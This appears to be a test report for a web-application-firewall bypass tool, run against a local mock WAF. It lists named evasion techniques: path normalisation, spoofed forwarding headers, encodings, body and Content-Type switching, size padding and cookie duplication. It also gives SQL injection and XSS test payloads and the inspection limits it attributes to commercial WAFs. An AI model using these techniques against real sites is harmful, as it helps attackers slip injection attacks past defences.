# wafbypass.py - test report

Date: 2026-11-22
Host: macOS arm64, Python 3.13.15
Work dir: /Users/0xjpg/tools/wafbypass
Files under test: `wafbypass.py` (engine), `sim_waf.py` (mock WAF + app, 127.0.0.1:8099)
`wafdetect.py` was not touched.

> Path note (2026-11-22): `sim_waf.py` now lives at `tests/sim_waf.py`,
> `wafdetect.py` at `tools/wafdetect.py`; transcripts below keep the
> original invocation paths.

Every block below is copied verbatim from the run, including exit codes.

## 1. Syntax check

```
$ python3 -m py_compile wafbypass.py sim_waf.py; echo "py_compile_exit=$?"
py_compile_exit=0
```

## 2. Server lifecycle

```
$ python3 sim_waf.py > /tmp/simwaf_final.log 2>&1 &
$ for i in $(seq 1 60); do curl -s -o /dev/null http://127.0.0.1:8099/ && break; sleep 0.2; done
```

First lines of the server log (one line per request: method, raw target,
status, reason):

```
sim_waf listening on http://127.0.0.1:8099
GET     / -> 200 allowed
GET     /admin.php?id=1&q='%20OR%201=1-- -> 403 rule1-path-admin
GET     /hng4ud23x6ki -> 404 allowed
GET     //admin.php?id=1 -> 200 allowed
GET     /./admin.php?id=1 -> 200 allowed
GET     /%2e/admin.php?id=1 -> 200 allowed
GET     /admin.php;?id=1 -> 403 rule1-path-admin
...
```

Total request lines logged for the whole capture: 359.

The simulator has no fail-open path: rule 1 matches the raw `/admin` prefix,
rule 2 runs only on `/search`, rule 5 decodes only the first 64 bytes of a
non-chunked urlencoded `/submit` body, plus the dedicated `/cookies` and
`/flaky` endpoints. A BYPASS row always maps to a concrete rule gap.

## 3. Run A - path/header/method sweep on a blocked admin page

```
$ python3 wafbypass.py -u http://127.0.0.1:8099/admin.php?id=1 --mode all -t 4
```

```
[*] target   http://127.0.0.1:8099/admin.php?id=1   mode=all   param=q   profile=generic
[*] payload  ' OR 1=1--
[*] baseline GET /admin.php?id=1&q='%20OR%201=1-- -> 403 / 18 bytes  "403 Blocked by WAF"
[*] control  GET -> 404 / 13 bytes  "404 Not Found"

MODE      VARIANT                METHOD STATUS  BYTES  VERDICT   SNIPPET
----------------------------------------------------------------------------------------------------
path      double-slash           GET    200     28     BYPASS    ADMIN PANEL flag{waf_bypass}
path      dot-segment            GET    200     28     BYPASS    ADMIN PANEL flag{waf_bypass}
path      pct-dot                GET    200     28     BYPASS    ADMIN PANEL flag{waf_bypass}
path      double-pct-dot         GET    404     13     NOTFOUND  404 Not Found
path      semicolon-suffix       GET    403     18     BLOCKED   403 Blocked by WAF
path      dotdot-semicolon       GET    403     18     BLOCKED   403 Blocked by WAF
path      trailing-dot           GET    403     18     BLOCKED   403 Blocked by WAF
path      trailing-slash         GET    403     18     BLOCKED   403 Blocked by WAF
path      space-suffix           GET    403     18     BLOCKED   403 Blocked by WAF
path      tab-suffix             GET    403     18     BLOCKED   403 Blocked by WAF
path      nul-suffix             GET    403     18     BLOCKED   403 Blocked by WAF
path      nul-png                GET    403     18     BLOCKED   403 Blocked by WAF
path      slash-to-pct2f         GET    200     28     BYPASS    ADMIN PANEL flag{waf_bypass}
path      slash-to-pct252f       GET    404     13     NOTFOUND  404 Not Found
path      backslash              GET    200     28     BYPASS    ADMIN PANEL flag{waf_bypass}
path      backslash-pct          GET    200     28     BYPASS    ADMIN PANEL flag{waf_bypass}
path      case-toggle            GET    404     13     NOTFOUND  404 Not Found
path      dotdot-prefix          GET    200     28     BYPASS    ADMIN PANEL flag{waf_bypass}
header    xff-127.0.0.1          GET    200     28     BYPASS    ADMIN PANEL flag{waf_bypass}
header    xff-localhost          GET    200     28     BYPASS    ADMIN PANEL flag{waf_bypass}
header    x-forwarded-host       GET    403     18     BLOCKED   403 Blocked by WAF
header    x-original-url         GET    200     28     BYPASS    ADMIN PANEL flag{waf_bypass}
header    x-rewrite-url          GET    200     28     BYPASS    ADMIN PANEL flag{waf_bypass}
header    x-real-ip              GET    403     18     BLOCKED   403 Blocked by WAF
header    x-client-ip            GET    403     18     BLOCKED   403 Blocked by WAF
header    x-remote-ip            GET    403     18     BLOCKED   403 Blocked by WAF
header    x-remote-addr          GET    403     18     BLOCKED   403 Blocked by WAF
header    true-client-ip         GET    403     18     BLOCKED   403 Blocked by WAF
header    cf-connecting-ip       GET    403     18     BLOCKED   403 Blocked by WAF
header    forwarded-for          GET    403     18     BLOCKED   403 Blocked by WAF
header    x-http-method-override GET    403     18     BLOCKED   403 Blocked by WAF
header    x-method-override      GET    403     18     BLOCKED   403 Blocked by WAF
header    ua-googlebot           GET    403     18     BLOCKED   403 Blocked by WAF
header    referer-same-origin    GET    403     18     BLOCKED   403 Blocked by WAF
method    method-GET             GET    403     18     BLOCKED   403 Blocked by WAF
method    method-HEAD            HEAD   200     0      DIFF      <empty body>
method    method-OPTIONS         OPTIONS 200     28     BYPASS    ADMIN PANEL flag{waf_bypass}
method    method-PUT             PUT    403     18     BLOCKED   403 Blocked by WAF
method    method-PATCH           PATCH  403     18     BLOCKED   403 Blocked by WAF
method    method-TRACE           TRACE  403     18     BLOCKED   403 Blocked by WAF
method    method-POST            POST   403     18     BLOCKED   403 Blocked by WAF
method    override-post          POST   403     18     BLOCKED   403 Blocked by WAF
body      urlencoded             POST   403     18     BLOCKED   403 Blocked by WAF
body      json                   POST   403     18     BLOCKED   403 Blocked by WAF
body      multipart              POST   403     18     BLOCKED   403 Blocked by WAF
body      chunked                POST   403     18     BLOCKED   403 Blocked by WAF
body      hpp                    POST   403     18     BLOCKED   403 Blocked by WAF
body      semicolon              POST   403     18     BLOCKED   403 Blocked by WAF
body      append-param           POST   403     18     BLOCKED   403 Blocked by WAF
encoding  enc-raw                GET    403     18     BLOCKED   403 Blocked by WAF
encoding  enc-url                GET    403     18     BLOCKED   403 Blocked by WAF
encoding  enc-double-url         GET    403     18     BLOCKED   403 Blocked by WAF
encoding  enc-uxxxx              GET    403     18     BLOCKED   403 Blocked by WAF
encoding  enc-hex                GET    403     18     BLOCKED   403 Blocked by WAF
encoding  enc-comment-space      GET    403     18     BLOCKED   403 Blocked by WAF
encoding  enc-mysql-comment      GET    403     18     BLOCKED   403 Blocked by WAF
encoding  enc-case-toggle        GET    403     18     BLOCKED   403 Blocked by WAF
encoding  enc-plus-space         GET    403     18     BLOCKED   403 Blocked by WAF
encoding  enc-tab-space          GET    403     18     BLOCKED   403 Blocked by WAF
encoding  enc-base64             GET    403     18     BLOCKED   403 Blocked by WAF
encoding  enc-html-entity        GET    403     18     BLOCKED   403 Blocked by WAF
cookie    cookie-plain           GET    403     18     BLOCKED   403 Blocked by WAF
cookie    cookie-phantom-octal   GET    403     18     BLOCKED   403 Blocked by WAF
cookie    cookie-duplicate       GET    403     18     BLOCKED   403 Blocked by WAF
ctype     ctype-json             POST   403     18     BLOCKED   403 Blocked by WAF
ctype     ctype-urlencoded       POST   403     18     BLOCKED   403 Blocked by WAF
ctype     ctype-multipart        POST   403     18     BLOCKED   403 Blocked by WAF
ctype     ctype-text             POST   403     18     BLOCKED   403 Blocked by WAF
size      size-8192              POST   403     18     BLOCKED   403 Blocked by WAF
size      size-8192-ctl          POST   403     18     BLOCKED   403 Blocked by WAF
size      size-65536             POST   403     18     BLOCKED   403 Blocked by WAF
size      size-65536-ctl         POST   403     18     BLOCKED   403 Blocked by WAF

[+] SUMMARY variants=72 bypass=12 blocked=56 notfound=3 diff=1 error=0 unstable=0
[i] stability: 13/13 confirmed
[+] BYPASS rows: path/double-slash(200), path/dot-segment(200), path/pct-dot(200), path/slash-to-pct2f(200), path/backslash(200), path/backslash-pct(200), path/dotdot-prefix(200), header/xff-127.0.0.1(200), header/xff-localhost(200), header/x-original-url(200), header/x-rewrite-url(200), method/method-OPTIONS(200)
exit=0
```

12 BYPASS: 7 path, 4 header, 1 method. The `all` family list now includes
`cookie`, `ctype` and `size`, so the variant total moved from 61 to 72; the
BYPASS count and the 12 row names are unchanged. All body, encoding, cookie,
ctype and size rows are `403 BLOCKED` because rule 1 fires on the `/admin.php`
prefix before query/body/cookie inspection.

## 4. Run B - query inspection on /search (rule 2)

```
$ python3 wafbypass.py -u 'http://127.0.0.1:8099/search?q=1' --preset sqli --param q --mode encoding
```

```
[*] target   http://127.0.0.1:8099/search?q=1   mode=encoding   param=q   profile=generic
[*] payload  ' UNION SELECT 1,2,3-- -
[*] baseline GET /search?q='%20UNION%20SELECT%201,2,3--%20- -> 403 / 18 bytes  "403 Blocked by WAF"
[*] control  GET -> 404 / 13 bytes  "404 Not Found"

MODE      VARIANT                METHOD STATUS  BYTES  VERDICT   SNIPPET
----------------------------------------------------------------------------------------------------
encoding  enc-raw                GET    403     18     BLOCKED   403 Blocked by WAF
encoding  enc-url                GET    403     18     BLOCKED   403 Blocked by WAF
encoding  enc-double-url         GET    200     9      BYPASS    SEARCH OK
encoding  enc-uxxxx              GET    200     9      BYPASS    SEARCH OK
encoding  enc-hex                GET    200     9      BYPASS    SEARCH OK
encoding  enc-comment-space      GET    200     9      BYPASS    SEARCH OK
encoding  enc-mysql-comment      GET    200     9      BYPASS    SEARCH OK
encoding  enc-case-toggle        GET    403     18     BLOCKED   403 Blocked by WAF
encoding  enc-plus-space         GET    403     18     BLOCKED   403 Blocked by WAF
encoding  enc-tab-space          GET    403     18     BLOCKED   403 Blocked by WAF
encoding  enc-base64             GET    200     9      BYPASS    SEARCH OK
encoding  enc-html-entity        GET    200     9      BYPASS    SEARCH OK

[+] SUMMARY variants=12 bypass=7 blocked=5 notfound=0 diff=0 error=0 unstable=0
[i] stability: 7/7 confirmed
[+] BYPASS rows: encoding/enc-double-url(200), encoding/enc-uxxxx(200), encoding/enc-hex(200), encoding/enc-comment-space(200), encoding/enc-mysql-comment(200), encoding/enc-base64(200), encoding/enc-html-entity(200)
exit=0
```

7 BYPASS (double-url, uxxx, hex, comment-space, mysql-comment, base64,
html-entity), 5 BLOCKED (raw, url, case-toggle, plus-space, tab-space).
Baseline is the raw payload and is 403, so the block being defeated is real.

## 5. Run C - body inspection on /submit (rule 5)

```
$ python3 wafbypass.py -u http://127.0.0.1:8099/submit --mode body --payload "' UNION SELECT 1" --param q
```

```
[*] target   http://127.0.0.1:8099/submit   mode=body   param=q   profile=generic
[*] payload  ' UNION SELECT 1
[*] baseline POST /submit -> 403 / 18 bytes  "403 Blocked by WAF"
[*] control  GET -> 404 / 13 bytes  "404 Not Found"

MODE      VARIANT                METHOD STATUS  BYTES  VERDICT   SNIPPET
----------------------------------------------------------------------------------------------------
body      urlencoded             POST   403     18     BLOCKED   403 Blocked by WAF
body      json                   POST   200     7      BYPASS    BODY OK
body      multipart              POST   200     7      BYPASS    BODY OK
body      chunked                POST   200     7      BYPASS    BODY OK
body      hpp                    POST   403     18     BLOCKED   403 Blocked by WAF
body      semicolon              POST   403     18     BLOCKED   403 Blocked by WAF
body      append-param           POST   403     18     BLOCKED   403 Blocked by WAF

[+] SUMMARY variants=7 bypass=3 blocked=4 notfound=0 diff=0 error=0 unstable=0
[i] stability: 3/3 confirmed
[+] BYPASS rows: body/json(200), body/multipart(200), body/chunked(200)
exit=0
```

3 BYPASS (json, multipart, chunked), 4 BLOCKED (urlencoded, hpp, semicolon,
append-param). The urlencoded payload sits inside the 64-byte inspection
window; the other content types are never decoded.

## 6. Run D - negative control on an allowed page

```
$ python3 wafbypass.py -u http://127.0.0.1:8099/home --mode all
```

```
[*] target   http://127.0.0.1:8099/home   mode=all   param=q   profile=generic
[*] payload  ' OR 1=1--
[*] baseline GET /home?q='%20OR%201=1-- -> 200 / 39 bytes  "<html><body><h1>home</h1></body></html>"
[i] baseline already returns 2xx (nothing is being blocked); BYPASS rows cannot be proven against it
[*] control  GET -> 404 / 13 bytes  "404 Not Found"

MODE      VARIANT                METHOD STATUS  BYTES  VERDICT   SNIPPET
----------------------------------------------------------------------------------------------------
path      double-slash           GET    200     39     BLOCKED   <html><body><h1>home</h1></body></html>
path      dot-segment            GET    200     39     BLOCKED   <html><body><h1>home</h1></body></html>
path      pct-dot                GET    200     39     BLOCKED   <html><body><h1>home</h1></body></html>
path      double-pct-dot         GET    404     13     NOTFOUND  404 Not Found
path      semicolon-suffix       GET    200     39     BLOCKED   <html><body><h1>home</h1></body></html>
path      dotdot-semicolon       GET    200     39     BLOCKED   <html><body><h1>home</h1></body></html>
path      trailing-dot           GET    200     39     BLOCKED   <html><body><h1>home</h1></body></html>
path      trailing-slash         GET    200     39     BLOCKED   <html><body><h1>home</h1></body></html>
path      space-suffix           GET    404     13     NOTFOUND  404 Not Found
path      tab-suffix             GET    404     13     NOTFOUND  404 Not Found
path      nul-suffix             GET    404     13     NOTFOUND  404 Not Found
path      nul-png                GET    404     13     NOTFOUND  404 Not Found
path      slash-to-pct2f         GET    200     39     BLOCKED   <html><body><h1>home</h1></body></html>
path      slash-to-pct252f       GET    404     13     NOTFOUND  404 Not Found
path      backslash              GET    200     39     BLOCKED   <html><body><h1>home</h1></body></html>
path      backslash-pct          GET    200     39     BLOCKED   <html><body><h1>home</h1></body></html>
path      case-toggle            GET    404     13     NOTFOUND  404 Not Found
path      dotdot-prefix          GET    200     39     BLOCKED   <html><body><h1>home</h1></body></html>
header    xff-127.0.0.1          GET    200     39     BLOCKED   <html><body><h1>home</h1></body></html>
header    xff-localhost          GET    200     39     BLOCKED   <html><body><h1>home</h1></body></html>
header    x-forwarded-host       GET    200     39     BLOCKED   <html><body><h1>home</h1></body></html>
header    x-original-url         GET    200     39     BLOCKED   <html><body><h1>home</h1></body></html>
header    x-rewrite-url          GET    200     39     BLOCKED   <html><body><h1>home</h1></body></html>
header    x-real-ip              GET    200     39     BLOCKED   <html><body><h1>home</h1></body></html>
header    x-client-ip            GET    200     39     BLOCKED   <html><body><h1>home</h1></body></html>
header    x-remote-ip            GET    200     39     BLOCKED   <html><body><h1>home</h1></body></html>
header    x-remote-addr          GET    200     39     BLOCKED   <html><body><h1>home</h1></body></html>
header    true-client-ip         GET    200     39     BLOCKED   <html><body><h1>home</h1></body></html>
header    cf-connecting-ip       GET    200     39     BLOCKED   <html><body><h1>home</h1></body></html>
header    forwarded-for          GET    200     39     BLOCKED   <html><body><h1>home</h1></body></html>
header    x-http-method-override GET    200     39     BLOCKED   <html><body><h1>home</h1></body></html>
header    x-method-override      GET    200     39     BLOCKED   <html><body><h1>home</h1></body></html>
header    ua-googlebot           GET    200     39     BLOCKED   <html><body><h1>home</h1></body></html>
header    referer-same-origin    GET    200     39     BLOCKED   <html><body><h1>home</h1></body></html>
method    method-GET             GET    200     39     BLOCKED   <html><body><h1>home</h1></body></html>
method    method-HEAD            HEAD   200     0      DIFF      <empty body>
method    method-OPTIONS         OPTIONS 200     39     BLOCKED   <html><body><h1>home</h1></body></html>
method    method-PUT             PUT    200     39     BLOCKED   <html><body><h1>home</h1></body></html>
method    method-PATCH           PATCH  200     39     BLOCKED   <html><body><h1>home</h1></body></html>
method    method-TRACE           TRACE  200     39     BLOCKED   <html><body><h1>home</h1></body></html>
method    method-POST            POST   200     39     BLOCKED   <html><body><h1>home</h1></body></html>
method    override-post          POST   200     39     BLOCKED   <html><body><h1>home</h1></body></html>
body      urlencoded             POST   200     39     BLOCKED   <html><body><h1>home</h1></body></html>
body      json                   POST   200     39     BLOCKED   <html><body><h1>home</h1></body></html>
body      multipart              POST   200     39     BLOCKED   <html><body><h1>home</h1></body></html>
body      chunked                POST   200     39     BLOCKED   <html><body><h1>home</h1></body></html>
body      hpp                    POST   200     39     BLOCKED   <html><body><h1>home</h1></body></html>
body      semicolon              POST   200     39     BLOCKED   <html><body><h1>home</h1></body></html>
body      append-param           POST   200     39     BLOCKED   <html><body><h1>home</h1></body></html>
encoding  enc-raw                GET    200     39     BLOCKED   <html><body><h1>home</h1></body></html>
encoding  enc-url                GET    200     39     BLOCKED   <html><body><h1>home</h1></body></html>
encoding  enc-double-url         GET    200     39     BLOCKED   <html><body><h1>home</h1></body></html>
encoding  enc-uxxxx              GET    200     39     BLOCKED   <html><body><h1>home</h1></body></html>
encoding  enc-hex                GET    200     39     BLOCKED   <html><body><h1>home</h1></body></html>
encoding  enc-comment-space      GET    200     39     BLOCKED   <html><body><h1>home</h1></body></html>
encoding  enc-mysql-comment      GET    200     39     BLOCKED   <html><body><h1>home</h1></body></html>
encoding  enc-case-toggle        GET    200     39     BLOCKED   <html><body><h1>home</h1></body></html>
encoding  enc-plus-space         GET    200     39     BLOCKED   <html><body><h1>home</h1></body></html>
encoding  enc-tab-space          GET    200     39     BLOCKED   <html><body><h1>home</h1></body></html>
encoding  enc-base64             GET    200     39     BLOCKED   <html><body><h1>home</h1></body></html>
encoding  enc-html-entity        GET    200     39     BLOCKED   <html><body><h1>home</h1></body></html>
cookie    cookie-plain           GET    200     39     BLOCKED   <html><body><h1>home</h1></body></html>
cookie    cookie-phantom-octal   GET    200     39     BLOCKED   <html><body><h1>home</h1></body></html>
cookie    cookie-duplicate       GET    200     39     BLOCKED   <html><body><h1>home</h1></body></html>
ctype     ctype-json             POST   200     39     BLOCKED   <html><body><h1>home</h1></body></html>
ctype     ctype-urlencoded       POST   200     39     BLOCKED   <html><body><h1>home</h1></body></html>
ctype     ctype-multipart        POST   200     39     BLOCKED   <html><body><h1>home</h1></body></html>
ctype     ctype-text             POST   200     39     BLOCKED   <html><body><h1>home</h1></body></html>
size      size-8192              POST   200     39     BLOCKED   <html><body><h1>home</h1></body></html>
size      size-8192-ctl          POST   200     39     BLOCKED   <html><body><h1>home</h1></body></html>
size      size-65536             POST   200     39     BLOCKED   <html><body><h1>home</h1></body></html>
size      size-65536-ctl         POST   200     39     BLOCKED   <html><body><h1>home</h1></body></html>

[+] SUMMARY variants=72 bypass=0 blocked=64 notfound=7 diff=1 error=0 unstable=0
[i] stability: 1/1 confirmed
[+] BYPASS rows: none
exit=1
```

0 BYPASS, exit 1. The baseline is 2xx and the engine says so before the table.

## 7. Run E - size window, modsec profile

```
$ python3 wafbypass.py -u http://127.0.0.1:8099/submit --mode size --profile modsec --payload "UNION SELECT 1"
```

```
[*] target   http://127.0.0.1:8099/submit   mode=size   param=q   profile=modsec
[*] payload  UNION SELECT 1
[*] baseline POST /submit -> 403 / 18 bytes  "403 Blocked by WAF"
[*] control  GET -> 404 / 13 bytes  "404 Not Found"

MODE      VARIANT                METHOD STATUS  BYTES  VERDICT   SNIPPET
----------------------------------------------------------------------------------------------------
size      size-131072            POST   200     7      BYPASS    BODY OK
size      size-131072-ctl        POST   403     18     BLOCKED   403 Blocked by WAF

[+] SUMMARY variants=2 bypass=1 blocked=1 notfound=0 diff=0 error=0 unstable=0
[i] stability: 1/1 confirmed
[+] BYPASS rows: size/size-131072(200)
exit=0
```

Baseline is the canonical urlencoded POST and is 403. `size-131072` puts the
payload at offset 131056, outside the 64-byte window, and gets `200 BODY OK`;
`size-131072-ctl` keeps the payload at offset 0 and is still `403 BLOCKED`.
The pair rule only promotes the padded row because the control is blocked and
the bodies differ. Stability 1/1.

## 8. Run F - cookie differential

```
$ python3 wafbypass.py -u http://127.0.0.1:8099/cookies --mode cookie --payload "eval(alert(1))"
```

```
[*] target   http://127.0.0.1:8099/cookies   mode=cookie   param=q   profile=generic
[*] payload  eval(alert(1))
[*] baseline GET /cookies -> 403 / 18 bytes  "403 cookie blocked"
[*] control  GET -> 404 / 13 bytes  "404 Not Found"

MODE      VARIANT                METHOD STATUS  BYTES  VERDICT   SNIPPET
----------------------------------------------------------------------------------------------------
cookie    cookie-plain           GET    403     18     BLOCKED   403 cookie blocked
cookie    cookie-phantom-octal   GET    200     9      BYPASS    COOKIE OK
cookie    cookie-duplicate       GET    200     9      BYPASS    COOKIE OK

[+] SUMMARY variants=3 bypass=2 blocked=1 notfound=0 diff=0 error=0 unstable=0
[i] stability: 2/2 confirmed
[+] BYPASS rows: cookie/cookie-phantom-octal(200), cookie/cookie-duplicate(200)
exit=0
```

Plain `Cookie: q=eval(alert(1))` is `403 18 BLOCKED`. The phantom
`$Version=1; q="\145\166..."` form and the duplicate
`q=1; q=eval(alert(1))` form both return `200 COOKIE OK`. The simulator checks
only the first `q` value, which is the documented bypass surface. Stability
2/2.

## 9. Run G - Content-Type parser differential

```
$ python3 wafbypass.py -u http://127.0.0.1:8099/submit --mode ctype --payload "<script>alert(1)</script>"
```

```
[*] target   http://127.0.0.1:8099/submit   mode=ctype   param=q   profile=generic
[*] payload  <script>alert(1)</script>
[*] baseline POST /submit -> 403 / 18 bytes  "403 Blocked by WAF"
[*] control  GET -> 404 / 13 bytes  "404 Not Found"

MODE      VARIANT                METHOD STATUS  BYTES  VERDICT   SNIPPET
----------------------------------------------------------------------------------------------------
ctype     ctype-json             POST   200     7      BYPASS    BODY OK
ctype     ctype-urlencoded       POST   403     18     BLOCKED   403 Blocked by WAF
ctype     ctype-multipart        POST   200     7      BYPASS    BODY OK
ctype     ctype-text             POST   200     7      BYPASS    BODY OK

[+] SUMMARY variants=4 bypass=3 blocked=1 notfound=0 diff=0 error=0 unstable=0
[i] stability: 3/3 confirmed
[+] BYPASS rows: ctype/ctype-json(200), ctype/ctype-multipart(200), ctype/ctype-text(200)
exit=0
```

Baseline POST is urlencoded and 403. `ctype-json`, `ctype-multipart` and
`ctype-text` all return `200 BODY OK`; only `ctype-urlencoded` is blocked.
That is the actual sim behavior: rule 5 is scoped to the urlencoded type.
Stability 3/3.

## 10. Run H - stability gate on an alternating endpoint

```
$ python3 wafbypass.py -u http://127.0.0.1:8099/flaky --mode path --repeat 2
```

```
[*] target   http://127.0.0.1:8099/flaky   mode=path   param=q   profile=generic
[*] payload  ' OR 1=1--
[*] baseline GET /flaky -> 403 / 18 bytes  "403 Blocked by WAF"
[*] control  GET -> 404 / 13 bytes  "404 Not Found"

MODE      VARIANT                METHOD STATUS  BYTES  VERDICT   SNIPPET
----------------------------------------------------------------------------------------------------
path      double-slash           GET    200     8      UNSTABLE  FLAKY OK
path      dot-segment            GET    200     8      UNSTABLE  FLAKY OK
path      pct-dot                GET    403     18     BLOCKED   403 Blocked by WAF
path      double-pct-dot         GET    404     13     NOTFOUND  404 Not Found
path      semicolon-suffix       GET    403     18     BLOCKED   403 Blocked by WAF
path      dotdot-semicolon       GET    200     8      UNSTABLE  FLAKY OK
path      trailing-dot           GET    403     18     BLOCKED   403 Blocked by WAF
path      trailing-slash         GET    200     8      UNSTABLE  FLAKY OK
path      space-suffix           GET    403     18     BLOCKED   403 Blocked by WAF
path      tab-suffix             GET    200     8      UNSTABLE  FLAKY OK
path      nul-suffix             GET    403     18     BLOCKED   403 Blocked by WAF
path      nul-png                GET    403     18     BLOCKED   403 Blocked by WAF
path      slash-to-pct2f         GET    200     8      UNSTABLE  FLAKY OK
path      slash-to-pct252f       GET    404     13     NOTFOUND  404 Not Found
path      backslash              GET    200     8      UNSTABLE  FLAKY OK
path      backslash-pct          GET    403     18     BLOCKED   403 Blocked by WAF
path      case-toggle            GET    404     13     NOTFOUND  404 Not Found
path      dotdot-prefix          GET    200     8      UNSTABLE  FLAKY OK

[+] SUMMARY variants=18 bypass=0 blocked=7 notfound=3 diff=0 error=0 unstable=8
[i] stability: 0/8 confirmed
[+] BYPASS rows: none
[!] UNSTABLE rows: path/double-slash(200), path/dot-segment(200), path/dotdot-semicolon(200), path/trailing-slash(200), path/tab-suffix(200), path/slash-to-pct2f(200), path/backslash(200), path/dotdot-prefix(200)
exit=1
```

0 BYPASS, 8 UNSTABLE, 7 BLOCKED, 3 NOTFOUND, exit 1. The baseline is the
first `/flaky` request (counter 1, odd, 403). The 15 variants that route to
`/flaky` take counters 2-16, so exactly 8 land on an even counter and return
`200 FLAKY OK`; those 8 become candidates, and each sequential retry takes the
next counter and therefore the opposite parity, so every candidate flips
`200 -> 403` and none is confirmed. The 3 remaining variants normalize away
from `/flaky` and return the control-style 404. `[i] stability: 0/8 confirmed`.

Which variant names are UNSTABLE depends on thread scheduling (the even
counters are assigned by arrival order), but the count is fixed by the
parity split.

## 11. Profile x size-limit matrix

Each row is a real run of
`python3 wafbypass.py -u http://127.0.0.1:8099/submit --mode size --profile <p> --payload "UNION SELECT 1"`.
Cells are `variant: status/bytes verdict`.

| Profile | Limits (bytes) | Padded row (status/bytes/verdict) | Offset-0 control (status/bytes/verdict) |
|---|---|---|---|
| generic | 8192, 65536 | size-8192: 200/7 BYPASS<br>size-65536: 200/7 BYPASS | size-8192-ctl: 403/18 BLOCKED<br>size-65536-ctl: 403/18 BLOCKED |
| cloudflare | 131072, 1048576 | size-131072: 200/7 BYPASS<br>size-1048576: 200/7 BYPASS | size-131072-ctl: 403/18 BLOCKED<br>size-1048576-ctl: 403/18 BLOCKED |
| aws | 8192, 16384, 65536 | size-8192: 200/7 BYPASS<br>size-16384: 200/7 BYPASS<br>size-65536: 200/7 BYPASS | size-8192-ctl: 403/18 BLOCKED<br>size-16384-ctl: 403/18 BLOCKED<br>size-65536-ctl: 403/18 BLOCKED |
| akamai | 131072 | size-131072: 200/7 BYPASS | size-131072-ctl: 403/18 BLOCKED |
| imperva | 131072 | size-131072: 200/7 BYPASS | size-131072-ctl: 403/18 BLOCKED |
| f5 | 131072 | size-131072: 200/7 BYPASS | size-131072-ctl: 403/18 BLOCKED |
| azure | 131072 | size-131072: 200/7 BYPASS | size-131072-ctl: 403/18 BLOCKED |
| gcp | 65536 | size-65536: 200/7 BYPASS | size-65536-ctl: 403/18 BLOCKED |
| modsec | 131072 | size-131072: 200/7 BYPASS | size-131072-ctl: 403/18 BLOCKED |
| wordpress | 131072 | size-131072: 200/7 BYPASS | size-131072-ctl: 403/18 BLOCKED |

## 12. Failure paths

```
$ python3 wafbypass.py -u http://127.0.0.1:8099/admin.php --timeout 2
[x] baseline failed: ConnectionRefusedError: [Errno 61] Connection refused
exit=2
```

```
$ python3 wafbypass.py -u ftp://x/y
[x] unsupported scheme: ftp
exit=2
```

## 13. Shutdown and traceback check

```
$ pkill -f "sim_waf.py"
```

`grep -c Traceback` over runs A-H, all 10 profile runs, both failure-path
transcripts and the server log returns 0 for every file.

## 14. Acceptance mapping

| Requirement | Observed |
|---|---|
| A: path/header/method only | 12 BYPASS (7/4/1), body+cookie+ctype+size all BLOCKED, exit 0 |
| B: single-decode survivors on /search | 7 BYPASS, 5 BLOCKED, baseline 403, exit 0 |
| C: body parser scope | 3 BYPASS (json, multipart, chunked), 4 BLOCKED, exit 0 |
| D: negative control | 0 BYPASS, exit 1 |
| E: size window (modsec) | padded BYPASS 200, offset-0 control BLOCKED 403, stability 1/1 |
| F: cookie differential | phantom-octal and duplicate BYPASS 200, plain BLOCKED 403 |
| G: ctype differential | json/multipart/text BYPASS 200, urlencoded BLOCKED 403 |
| H: stability gate | 0 BYPASS, 8 UNSTABLE, `0/8 confirmed`, exit 1 |
| All 10 profiles x limits | 14 padded rows BYPASS 200, 14 offset-0 controls BLOCKED 403 |
| py_compile clean | `py_compile_exit=0` |
| No tracebacks | 0 matches in all captured logs |
